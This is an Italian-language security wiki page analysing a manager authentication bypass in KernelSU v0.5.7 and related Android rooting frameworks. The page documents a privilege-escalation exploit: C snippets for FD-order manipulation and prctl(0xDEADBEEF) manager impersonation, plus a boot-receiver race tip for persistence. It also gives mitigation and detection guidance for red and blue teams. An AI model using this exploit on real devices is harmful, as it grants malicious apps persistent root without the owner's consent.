# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

I rooting frameworks come KernelSU, APatch, SKRoot e Magisk applicano frequentemente patch al kernel Linux/Android ed espongono funzionalità privilegiate a un’app "manager" userspace non privilegiata tramite una syscall sottoposta a hook. Se il passaggio di autenticazione del manager è vulnerabile, qualsiasi app locale può raggiungere questo canale ed effettuare un privilege escalation sui dispositivi già sottoposti a root.

Questa pagina astrae le tecniche e le problematiche individuate nella ricerca pubblica (in particolare l’analisi di Zimperium su KernelSU v0.5.7) per aiutare i team red e blue a comprendere le attack surface, le primitive di exploit e le mitigazioni robuste.

---
## Architecture pattern: syscall-hooked manager channel

- Il modulo/patch del kernel applica un hook a una syscall (comunemente prctl) per ricevere "comandi" dallo userspace.
- Il protocollo è tipicamente: magic_value, command_id, arg_ptr/len ...
- Un’app manager userspace esegue prima l’autenticazione (ad esempio CMD_BECOME_MANAGER). Dopo che il kernel contrassegna il chiamante come manager trusted, vengono accettati i comandi privilegiati:
- Concedere root al chiamante (ad esempio CMD_GRANT_ROOT)
- Gestire allowlist/deny-list per su
- Modificare la policy SELinux (ad esempio CMD_SET_SEPOLICY)
- Interrogare versione/configurazione
- Poiché qualsiasi app può invocare le syscall, la correttezza dell’autenticazione del manager è fondamentale.

Esempio (design di KernelSU):
- Syscall sottoposta a hook: prctl
- Magic value per deviare la chiamata al gestore KernelSU: 0xDEADBEEF
- I comandi includono: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, ecc.

---
## KernelSU v0.5.7 authentication flow (as implemented)

Quando userspace chiama prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU verifica:

1) Path prefix check
- Il path fornito deve iniziare con un prefisso previsto per l’UID del chiamante, ad esempio /data/data/<pkg> o /data/user/<id>/<pkg>.
- Riferimento: core_hook.c (logica del path prefix di v0.5.7).

2) Ownership check
- Il path deve essere di proprietà dell’UID del chiamante.
- Riferimento: core_hook.c (logica di ownership di v0.5.7).

3) APK signature check via FD table scan
- Itera sui file descriptor (FD) aperti del processo chiamante.
- Seleziona il primo file il cui path corrisponde a /data/app/*/base.apk.
- Analizza la firma APK v2 e verifica la corrispondenza con il certificato ufficiale del manager.
- Riferimenti: manager.c (iterazione degli FD), apk_sign.c (verifica APK v2).

Se tutti i controlli hanno esito positivo, il kernel memorizza temporaneamente nella cache l’UID del manager e accetta i comandi privilegiati da tale UID fino al reset.

---
## Vulnerability class: trusting “the first matching APK” from FD iteration

Se il signature check si associa al "primo /data/app/*/base.apk corrispondente" trovato nella tabella FD del processo, in realtà non sta verificando il package del chiamante. Un attacker può pre-posizionare un APK con firma valida (quello del manager reale) in modo che compaia nella tabella FD prima del proprio base.apk.

Questo trust-by-indirection consente a un’app non privilegiata di impersonare il manager senza possedere la signing key del manager.

Proprietà chiave sfruttate:
- La scansione degli FD non associa il file all’identità del package del chiamante; verifica solo la corrispondenza dei path tramite pattern.
- open() restituisce il FD disponibile con il numero più basso. Chiudendo prima i FD con numeri inferiori, un attacker può controllare l’ordine.
- Il filtro verifica solo che il path corrisponda a /data/app/*/base.apk, non che corrisponda al package installato del chiamante.

---
## Attack preconditions

- Il dispositivo è già rooted con un rooting framework vulnerabile (ad esempio KernelSU v0.5.7).
- L’attacker può eseguire localmente codice arbitrario non privilegiato (processo di un’app Android).
- Il manager reale non si è ancora autenticato (ad esempio subito dopo un reboot). Alcuni framework memorizzano nella cache l’UID del manager dopo il successo; è necessario vincere la race.

---
## Exploitation outline (KernelSU v0.5.7)

Passaggi di alto livello:
1) Costruire un path valido alla directory dei dati della propria app per soddisfare i controlli di prefisso e ownership.
2) Assicurarsi che un base.apk autentico di KernelSU Manager venga aperto su un FD con numero inferiore rispetto al proprio base.apk.
3) Invocare prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) per superare i controlli.
4) Eseguire comandi privilegiati come CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY per rendere persistente l’elevation.

Note pratiche sul passaggio 2 (ordine degli FD):
- Identificare l’FD del proprio /data/app/*/base.apk nel processo percorrendo i symlink /proc/self/fd.
- Chiudere un FD con numero basso (ad esempio stdin, fd 0) e aprire prima l’APK del manager legittimo, in modo che occupi fd 0 (o qualsiasi indice inferiore all’FD del proprio base.apk).
- Includere l’APK del manager legittimo nella propria app in modo che il suo path soddisfi il filtro ingenuo del kernel. Ad esempio, collocarlo in un subpath corrispondente a /data/app/*/base.apk.

Example code snippets (Android/Linux, illustrative only):

Enumerate open FDs to locate base.apk entries:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Forza un FD con numero inferiore a puntare all'APK legittimo del manager:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Autenticazione del Manager tramite hook prctl:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Dopo il successo, comandi privilegiati (esempi):
- CMD_GRANT_ROOT: promuove il processo corrente a root
- CMD_ALLOW_SU: aggiunge il tuo package/UID alla allowlist per un su persistente
- CMD_SET_SEPOLICY: modifica la policy SELinux come supportato dal framework

Suggerimento per race/persistence:
- Registra un receiver BOOT_COMPLETED in AndroidManifest (RECEIVE_BOOT_COMPLETED) per avviarsi subito dopo il reboot e tentare l’autenticazione prima del manager reale.

---
## Indicazioni per il rilevamento e la mitigazione

Per gli sviluppatori di framework:
- Associa l’autenticazione al package/UID del chiamante, non a FD arbitrari:
- Risolvi il package del chiamante dal suo UID e verifica la firma rispetto al package installato (tramite PackageManager), invece di eseguire la scansione degli FD.
- Se operi esclusivamente a livello kernel, usa un’identità stabile del chiamante (task creds) e valida rispetto a una source of truth stabile gestita da init/helper in userspace, non rispetto agli FD del processo.
- Evita i controlli sul prefisso del path come identificativo; il chiamante può soddisfarli banalmente.
- Usa una challenge–response basata su nonce sul canale e cancella qualsiasi identità del manager memorizzata nella cache al boot o in occasione di eventi chiave.
- Valuta l’uso di IPC autenticato basato su binder invece di sovraccaricare le syscall generiche, quando possibile.

Per i defender/blue team:
- Rileva la presenza di rooting frameworks e dei processi del manager; monitora le chiamate prctl con magic constants sospette (ad esempio 0xDEADBEEF), se disponi di telemetria del kernel.
- Nei fleet gestiti, blocca o genera alert per i boot receiver di package non attendibili che tentano rapidamente comandi privilegiati del manager dopo il boot.
- Assicurati che i dispositivi siano aggiornati a versioni patchate del framework; invalida gli ID del manager memorizzati nella cache dopo un aggiornamento.

Limitazioni dell’attacco:
- Riguarda esclusivamente i dispositivi già rooted con un framework vulnerabile.
- In genere richiede un reboot/race window prima che il manager legittimo esegua l’autenticazione (alcuni framework memorizzano nella cache l’UID del manager fino al reset).

---
## Note correlate tra i framework

- L’autenticazione basata su password (ad esempio nelle build storiche di APatch/SKRoot) può essere debole se le password sono prevedibili o soggette a brute force, oppure se le validazioni presentano bug.
- L’autenticazione basata su package/signature (ad esempio KernelSU) è in linea di principio più solida, ma deve essere associata al chiamante effettivo, non ad artefatti indiretti come le scansioni degli FD.
- Magisk: CVE-2024-48336 (MagiskEoP) ha dimostrato che anche gli ecosistemi maturi possono essere vulnerabili allo spoofing dell’identità, con conseguente esecuzione di codice con root nel contesto del manager.

---
## Riferimenti

- [Zimperium – Il rooting di ogni male: falle di sicurezza che potrebbero compromettere il tuo dispositivo mobile](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – controlli dei path in core_hook.c (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – iterazione degli FD e controllo della firma in manager.c (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – verifica APK v2 in apk_sign.c (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [Progetto KernelSU](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [Video demo della PoC di KSU (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
